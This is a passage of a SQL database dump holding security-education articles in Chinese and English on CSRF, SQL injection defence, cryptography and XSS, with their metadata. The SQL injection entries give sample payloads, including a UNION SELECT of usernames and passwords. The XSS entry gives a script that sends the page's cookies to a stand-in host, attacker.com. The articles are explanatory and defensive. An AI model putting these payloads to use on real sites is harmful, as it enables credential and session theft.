Amplification：利用DN...',10,'medium','DDoS.html',1,8,0,'published','2026-04-03 04:55:51','2026-04-04 13:40:37'),(83,'CSRF攻击与防护','CSRF攻击与防护\n\n概念\n\n跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种攻击，迫使已登录用户执行非本意的操作。\n\n攻击原理\n\n1. 用户登录网站A\n2. 攻击者诱导用户访问恶意网站B\n3. 恶意网站B向网站A发起请求，使用用户的Cookie\n\n防护措施\n\n1. CSRF Token\n在表单中添加随机token。\n\n2. SameSite Cookie\n设置Cookie的SameSite属性。\n\n3. 验证Referer\n检查请求来源。\n\n4. 双重提交\n将token放在Cookie和参数中。\n\n相关标签\nCSRF, Web安全, 会话安全','CSRF攻击与防护\n\n概念\n\n跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种攻击，迫使已登录用户执行非本意的操作。\n\n攻击原理\n\n1. 用户登录网站A\n2. 攻击者诱导用户访问恶意网站B\n3. 恶意网站B向网站A发起请求，使用用户的Cookie\n\n防护措施\n\n1. CSRF Token\n在表单中添加随机token。\n\n2. SameSite Cookie\n设置...',10,'medium','CSRF.md',1,8,0,'published','2026-04-03 04:56:20','2026-04-04 13:40:37'),(85,'SQL注入防护指南','# SQL注入防护指南\n\n## 概述\n\nSQL注入（SQL Injection）是一种代码注入技术，攻击者通过在应用程序的用户输入中插入恶意SQL语句，从而操纵后台数据库。\n\n## 常见SQL注入类型\n\n### 1. 基于错误的SQL注入\n攻击者通过触发数据库错误来获取信息。\n\n```sql\n\' OR 1=1 --\n```\n\n### 2. 联合查询注入\n使用UNION SELECT语句获取其他表的数据。\n\n```sql\n\' UNION SELECT username, password FROM users --\n```\n\n### 3. 布尔型注入\n通过返回真假判断信息。\n\n```sql\n\' AND 1=1 --\n\' AND 1=2 --\n```\n\n## 防护措施\n\n### 1. 使用参数化查询\n永远不要直接拼接用户输入到SQL语句中。\n\n```python\n# 错误写法\nquery = f\"SELECT * FROM users WHERE name = \'{name}\'\"\n\n# 正确写法\ncursor.execute(\"SELECT * FROM users WHERE name = %s\", (name,))\n```\n\n### 2. 使用ORM框架\n如SQLAlchemy、Django ORM等自动处理转义。\n\n### 3. 输入验证\n白名单验证，过滤特殊字符。\n\n### 4. 最小权限原则\n数据库账户只授予必要的权限。\n\n## 相关标签\nSQL注入, Web安全, 数据库安全, 防护','# SQL注入防护指南\n\n## 概述\n\nSQL注入（SQL Injection）是一种代码注入技术，攻击者通过在应用程序的用户输入中插入恶意SQL语句，从而操纵后台数据库。\n\n## 常见SQL注入类型\n\n### 1. 基于错误的SQL注入\n攻击者通过触发数据库错误来获取信息。\n\n```sql\n\' OR 1=1 --\n```\n\n### 2. 联合查询注入\n使用UNION SELECT语句获取其他表的...',7,'medium','SQL.md',1,6,0,'published','2026-04-03 05:10:42','2026-04-04 13:59:45'),(89,'SQL Injection Protection Guide','SQL Injection Protection Guide\n\n# Overview\nSQL Injection is a code injection technique where attackers insert malicious SQL statements into application inputs to manipulate the database. It is one of the most common and dangerous web security vulnerabilities.\n\n# Common Types\nError-based SQL injection, Union query injection, Boolean-based blind injection, Time-based blind injection, Stacked queries injection.\n\n# Protection Measures\n1. Use parameterized queries 2. Use ORM frameworks 3. Input validation 4. Least privilege principle 5. Proper error handling','SQL Injection Protection Guide\n\n# Overview\nSQL Injection is a code injection technique where attackers insert malicious SQL statements into application inputs to manipulate the database. It is one of ...',7,'medium','SQL_Injection_Guide.docx',1,8,0,'published','2026-04-03 06:53:56','2026-04-04 14:01:30'),(101,'SQL Injection Protection Guide（2）','SQL Injection Protection Guide\nOverview\nSQL Injection is a code injection technique where attackers insert malicious SQL\nstatements into application inputs to manipulate the database. It is one of the most\ncommon and dangerous web security vulnerabilities.\nCommon Types\nError-based SQL injection, Union query injection, Boolean-based blind injection,\nTime-based blind injection, Stacked queries injection.\nProtection Measures\n1. Use parameterized queries 2. Use ORM frameworks 3. Input validation 4. Least\nprivilege principle 5. Proper error handling\nPython Example\nWrong: query = f\"SELECT * FROM users WHERE name = \"{name}\" Correct:\ncursor.execute(\"SELECT * FROM users WHERE name = %s\", (name,))','SQL Injection Protection Guide\nOverview\nSQL Injection is a code injection technique where attackers insert malicious SQL\nstatements into application inputs to manipulate the database. It is one of the...',7,'medium','SQL_Injection_Guide.pdf',1,3,0,'published','2026-04-03 15:46:26','2026-04-04 14:01:18'),(110,'密码学基础与应用','# 密码学基础与应用\n\n## 密码学概述\n\n密码学是研究信息加密、解密的技术学科，是网络安全的基石。\n\n## 对称加密\n\n使用相同的密钥进行加密和解密。\n\n### 常见算法\n- AES（高级加密标准）\n- DES（数据加密标准）\n- 3DES（三重DES）\n\n### AES算法特点\n- 分组长度：128位\n- 密钥长度：128/192/256位\n- 目前最广泛使用的对称加密算法\n\n## 非对称加密\n\n使用公钥加密，私钥解密。\n\n### RSA算法\n- 基于大数分解难题\n- 密钥长度通常2048位\n\n### 应用场景\n- HTTPS证书\n- 数字签名\n- 密钥交换\n\n## 哈希函数\n\n将任意长度的数据映射为固定长度的哈希值。\n\n### 常见算法\n- SHA-256\n- SHA-384\n- SHA-512\n- MD5（已不安全）\n\n## 密码学在网络安全中的应用\n\n### 1. 数据加密\n保护敏感数据的机密性。\n\n### 2. 数字签名\n确保数据完整性和来源认证。\n\n### 3. 身份认证\n密码学挑战-响应机制。\n\n### 4. 安全协议\nTLS/SSL、IPSec等。\n\n## 安全建议\n\n1. 避免使用弱加密算法（如DES）\n2. 使用足够长的密钥\n3. 密钥要安全存储\n4. 定期更新密钥\n\n## 相关标签\n密码学, AES, RSA, 加密, 网络安全基础','# 密码学基础与应用\n\n## 密码学概述\n\n密码学是研究信息加密、解密的技术学科，是网络安全的基石。\n\n## 对称加密\n\n使用相同的密钥进行加密和解密。\n\n### 常见算法\n- AES（高级加密标准）\n- DES（数据加密标准）\n- 3DES（三重DES）\n\n### AES算法特点\n- 分组长度：128位\n- 密钥长度：128/192/256位\n- 目前最广泛使用的对称加密算法\n\n## 非对称加密...',4,'medium','密码学基础与应用.md',1,4,0,'published','2026-04-04 13:15:52','2026-04-04 14:49:41'),(111,'XSS跨站脚本攻击详解','# XSS跨站脚本攻击详解\n\n## 什么是XSS\n\n跨站脚本攻击（Cross-Site Scripting，XSS）是一种代码注入攻击，攻击者通过在网页中注入恶意脚本代码，当用户浏览该页面时，嵌入的恶意代码会在用户的浏览器中执行。\n\n## XSS攻击类型\n\n### 1. 存储型XSS\n恶意代码被永久存储在目标服务器上。\n\n### 2. 反射型XSS\n恶意代码作为用户请求的一部分，服务器立即返回响应。\n\n### 3. DOM型XSS\n完全在客户端执行，不涉及服务器。\n\n## 攻击示例\n\n```html\n<script>\n  document.location=\'http://attacker.com/steal?cookie=\'+document.cookie\n</script>\n```\n\n## 防护策略\n\n### 1. 输入验证\n对用户输入进行严格验证。\n\n### 2. 输出编码\n对输出到HTML的内容进行编码。\n\n### 3. HttpOnly和Secure标志\n保护Cookie不被JavaScript读取。\n\n### 4. Content Security Policy\n使用CSP限制脚本来源。\n\n## 总结\nXSS是Web安全中最常见的安全问题之一，需要开发者在开发过程中时刻注意输入输出的安全性。\n\n## 相关标签\nXSS, 跨站脚本, Web安全, 前端安全','# XSS跨站脚本攻击详解\n\n## 什么是XSS\n\n跨站脚本攻击（Cross-Site Scripting，XSS）是一种代码注入攻击，攻击者通过在网页中注入恶意脚本代码，当用户浏览该页面时，嵌入的恶意代码会在用户的浏览器中执行。\n\n## XSS攻击类型\n\n### 1. 存储型XSS\n恶意代码被永久存储在目标服务器上。\n\n### 2. 反射型XSS\n恶意代码作为用户请求的一部分，服务器立即返回响应...',10,'medium','XSS跨站脚本攻击详解.md',1,38,1,'published','2026-04-04 13:16:18','2026-04-04 14:03:28');

